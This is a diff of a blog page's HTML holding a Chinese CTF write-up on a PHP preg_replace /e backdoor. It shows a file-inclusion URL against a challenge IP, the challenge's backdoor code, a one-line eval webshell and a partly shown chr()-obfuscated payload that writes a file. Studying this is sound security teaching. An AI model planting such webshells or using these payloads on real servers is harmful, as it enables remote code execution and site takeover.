@@ -100,7 +100,7 @@
 <meta property="og:url" content="http://Merl1ng.com/2018/01/20/preg_replace后门/index.html">
 <meta property="og:site_name" content="Merl1ng's blog">
 <meta property="og:description" content="php中正则替换所有符合条件的字符串 最近又在看正则 刚好记录下">
-<meta property="og:updated_time" content="2018-01-24T14:50:20.842Z">
+<meta property="og:updated_time" content="2018-01-24T14:53:43.209Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="preg_replace后门">
 <meta name="twitter:description" content="php中正则替换所有符合条件的字符串 最近又在看正则 刚好记录下">
@@ -356,8 +356,7 @@
 <a id="more"></a>
 <h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>题目是XCTF的一道新题</p>
 <p>题目连接 <a href="http://47.104.74.209:20005/index.php?page=index" target="_blank" rel="external">http://47.104.74.209:20005/index.php?page=index</a></p>
-<p>首先想到文件包含 </p>
-<p><a href="http://47.104.74.209:20005/index.php?page=php://filter/read=convert.base64-encode/resource=index.php" target="_blank" rel="external">http://47.104.74.209:20005/index.php?page=php://filter/read=convert.base64-encode/resource=index.php</a> </p>
+<p>首先想到文件包含<br><a href="http://47.104.74.209:20005/index.php?page=php://filter/read=convert.base64-encode/resource=index.php" target="_blank" rel="external">http://47.104.74.209:20005/index.php?page=php://filter/read=convert.base64-encode/resource=index.php</a> </p>
 <p>读到源码 其中第121行</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">&lt;?php</div><div class="line">//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试</div><div class="line"></div><div class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">'HTTP_X_FORWARDED_FOR'</span>] === <span class="string">'127.0.0.1'</span>) &#123;</div><div class="line">    <span class="built_in">echo</span> <span class="string">"&lt;br &gt;Welcome My Admin ! &lt;br &gt;"</span>;</div><div class="line">    <span class="variable">$pattern</span> = <span class="variable">$_GET</span>[pat];</div><div class="line">    <span class="variable">$replacement</span> = <span class="variable">$_GET</span>[rep];</div><div class="line">    <span class="variable">$subject</span> = <span class="variable">$_GET</span>[sub];</div><div class="line">    <span class="keyword">if</span> (isset(<span class="variable">$pattern</span>) &amp;&amp; isset(<span class="variable">$replacement</span>) &amp;&amp; isset(<span class="variable">$subject</span>)) &#123;</div><div class="line">        preg_replace(<span class="variable">$pattern</span>, <span class="variable">$replacement</span>, <span class="variable">$subject</span>);</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        die();</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
 <p>发现是 preg_replace 后门</p>
@@ -383,12 +382,17 @@
 <p>用()括起来表示匹配到的字符串可以作为一个变量被其他表达式使用,第一个()里面的内容就是变量1,被其他表达式引用的时候用$1代表</p>
 <p>如果正则表达式里面有第二个(),那么第二个()匹配到的内容就可以用$2被其他表达式引用,以此类推</p>
 <p>[和/和]是正则表达式内部要用到的符号,所以在匹配[和]的时候要用[和\/和]来转义  所以[b]就匹配[b]</p>
-<p>所以’/[b](.*)[\/b}/i’,’<b>$1</b>‘就是把[b]粗体字[/b]替换成<b>粗体字</b></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">所以<span class="string">'/\[b\](.*)\[\/b\&#125;/i'</span>,<span class="string">'&lt;b&gt;$1&lt;/b&gt;'</span>就是把[b]粗体字[/b]替换成&lt;b&gt;粗体字&lt;/b&gt;</div></pre></td></tr></table></figure>
 <p>其他的一些可以参考<br><a href="https://www.cnblogs.com/chenshishuo/p/4912456.html" target="_blank" rel="external">https://www.cnblogs.com/chenshishuo/p/4912456.html</a><br><a href="http://www.jb51.net/article/46458.htm" target="_blank" rel="external">http://www.jb51.net/article/46458.htm</a></p>
 <h3 id="preg-replace危险的-e修饰符-一句话后门常用"><a href="#preg-replace危险的-e修饰符-一句话后门常用" class="headerlink" title="preg_replace危险的/e修饰符(一句话后门常用)"></a>preg_replace危险的/e修饰符(一句话后门常用)</h3><p>先看下 PHP 正则表达式修饰符</p>
 <p>修饰符被放在PHP正则表达式定界符“/”尾部，在正则表达式尾部引号之前。</p>
 <p>i 忽略大小写，匹配不考虑大小写<br>m 多行独立匹配，如果字符串不包含[\n]等换行符就和普通正则一样。<br>s 设置正则符号 . 可以匹配换行符[\n]，如果没有设置，正则符号.不能匹配换行符\n。<br>x 忽略没有转义的空格<br><strong>e eval() 对匹配后的元素执行函数。</strong><br>A 前置锚定，约束匹配仅从目标字符串开始搜索<br>D 锁定$作为结尾，如果没有D，如果字符串包含[\n]等换行符，$依旧依旧匹配换行符。如果设置了修饰符m，修饰符D 就会被忽略。<br>S 对非锚定的匹配进行分析<br>U 非贪婪，如果在正则字符量词后加“?”，就可以恢复贪婪<br>X 打开与perl 不兼容附件<br>u 强制字符串为UTF-8编码，一般在非UTF-8编码的文档中才需要这个</p>
-<p>我们知道eval函数在php内经常被用来执行一句话木马 被认为是十分不安全的 如<figure class="highlight bash"><figcaption><span><?php @eval($_POST['c']);?>```</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">即 /e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码（在适当的逆向引用替换完之后） </div><div class="line"></div><div class="line">提示:要确保replacement 构成一个合法的 PHP 代码字符串,否则 PHP 会在报告在包含 preg_replace() 的行中出现语法解析错误</div><div class="line"></div><div class="line">如我们构造</div><div class="line"></div><div class="line">```bash</div><div class="line">&lt;? </div><div class="line"><span class="built_in">echo</span> preg_replace(<span class="string">"/test/e"</span>,<span class="variable">$_GET</span>[<span class="string">"h"</span>],<span class="string">"jutst test"</span>); </div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
+<p>我们知道eval函数在php内经常被用来执行一句话木马 被认为是十分不安全的 如</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;?php @<span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">'c'</span>]);?&gt;</div></pre></td></tr></table></figure>
+<p>即 /e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码（在适当的逆向引用替换完之后） </p>
+<p>提示:要确保replacement 构成一个合法的 PHP 代码字符串,否则 PHP 会在报告在包含 preg_replace() 的行中出现语法解析错误</p>
+<p>如我们构造</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;? </div><div class="line"><span class="built_in">echo</span> preg_replace(<span class="string">"/test/e"</span>,<span class="variable">$_GET</span>[<span class="string">"h"</span>],<span class="string">"jutst test"</span>); </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
 <p>如果我们提交?h=phpinfo()，phpinfo()将会被执行（使用/e修饰符，preg_replace会将 replacement 参数当作 PHP 代码执行）</p>
 <p>如果提交的是<br>?h=eval(chr(102).chr(112).chr(117).chr(116).chr(115).chr(40).chr(102).chr(111).chr(112).chr(101).chr(110).chr(40).chr(39)</p>
 <p>.chr(100).chr(97).chr(116).chr(97).chr(47).chr(97).chr(46).chr(112).chr(104).chr(112).chr(39).chr(44).chr(39).chr(119).chr(39)</p>
